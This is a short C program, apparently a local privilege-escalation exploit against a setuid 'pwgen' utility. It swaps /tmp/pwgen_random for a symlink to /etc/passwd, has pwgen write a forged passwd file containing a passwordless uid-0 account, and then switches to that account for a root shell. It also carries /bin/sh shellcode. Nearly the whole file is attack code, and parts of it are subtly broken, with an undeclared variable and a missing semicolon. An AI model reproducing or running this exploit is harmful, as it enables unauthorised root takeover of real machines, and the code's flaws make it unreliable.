// permissions vulnerability
#include <stdio.h>
#include "stdlib.h"
#include <sys/wait.h>
#include <shadow.h>
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

//check /tmp/pwgen_random
#define FILE_INPUT "\nroot:x:0:0:root:/root:/bin/bash\n\
user::1000:1000::/home/user:/bin/sh\n\
halt::0:1001::/:/sbin/halt\n\
sshd:x:100:65534::/var/run/sshd:/usr/sbin/nologin\n\
newuser::0:0:root:/root:/bin/bash\n"

int main(int argc, char *argv[])
{
  FILE *p1;
  //popen is a pipe to a new process and write command input to it.
  // popen returns stdin for process
  p1 = popen("pwgen -e", "w"); 
  ///tmp/pwgen_random is created based on pwgen file code becoz we run pwgen
  remove("/tmp/pwgen_random"); 
  //set uid set on a binary 
  symlink("/etc/passwd", "/tmp/pwgen_random"); 
  // create new symbolic link to /tmp/pwgen_random
  //looks like ur accessing /tmp/pwgen_random
  //write exploit string which can be found in the original /tmp/pwgen_random file 
  fprintf(p1, FILE_INPUT);           
  printf("exploit successful switching to new user  ");
  fclose(p1);
  
  check_sys = system("su newuser")
  if ( check_sys == -1) /*Switches user to newuser*/
  {
    perror("system");
    exit(EXIT_FAILURE);
  }
  return 0;
}